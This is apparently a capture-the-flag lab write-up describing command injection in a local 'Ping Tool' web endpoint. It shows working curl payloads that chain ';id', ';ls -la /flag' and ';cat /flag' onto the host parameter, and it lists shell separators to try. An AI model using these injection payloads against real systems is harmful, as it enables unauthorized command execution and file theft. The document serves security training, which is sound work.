---
title: "Ping Tool Command Injection"
category: web
slug: ping-command-injection
created: 2026-03-28
status: solved
tags:
  - command-injection
  - rce
  - ping
  - localhost
doc_kind: writeup
---
# Ping Tool Command Injection

## Challenge Summary

- Source: Local CTF lab (BUUCTF-style)
- Target: http://localhost:5002/ping
- Goal: Read `/flag` file via command injection

## Initial Signals

- Entry point: `/ping` route with `host` parameter
- Visible hints: "Ping Tool" interface suggesting shell command execution
- First confirming probe: Base request showed `/bin/sh: 1: ping: not found` confirming shell execution

## Exploit Chain

1. **Verify command injection** - Append `;id` to host parameter
2. **Confirm root privileges** - `uid=0(root)` in output
3. **Check flag existence** - `ls -la /flag` shows file exists
4. **Read flag** - `cat /flag` retrieves flag content

## Key Evidence

- Endpoint executes commands via `/bin/sh`
- User input directly concatenated into shell command without sanitization
- Semicolon `;` successfully chains commands
- Container runs as root (uid=0)

## Dead Ends

- None encountered - direct path from probe to flag

## Payloads And Commands

```bash
# Verify injection
curl "http://localhost:5002/ping?host=127.0.0.1;id"
# Output: uid=0(root) gid=0(root) groups=0(root)

# Check flag file
curl "http://localhost:5002/ping?host=127.0.0.1;ls+-la+/flag"

# Read flag
curl "http://localhost:5002/ping?host=127.0.0.1;cat+/flag"
```

## Flag / Outcome

- Flag: `CTF{rce_found_your_way_through_2026}`

## Reusable Lessons

- Ping tools are classic command injection vectors
- Even when base command fails (`ping: not found`), injection may still work
- Always check privileges with `id` early
- Common separators to test: `;`, `|`, `&`, `&&`, `||`

## Pattern Candidates

- Existing pattern to update: None - straightforward injection
- New pattern worth creating: Consider adding "ping tool injection" to command injection patterns
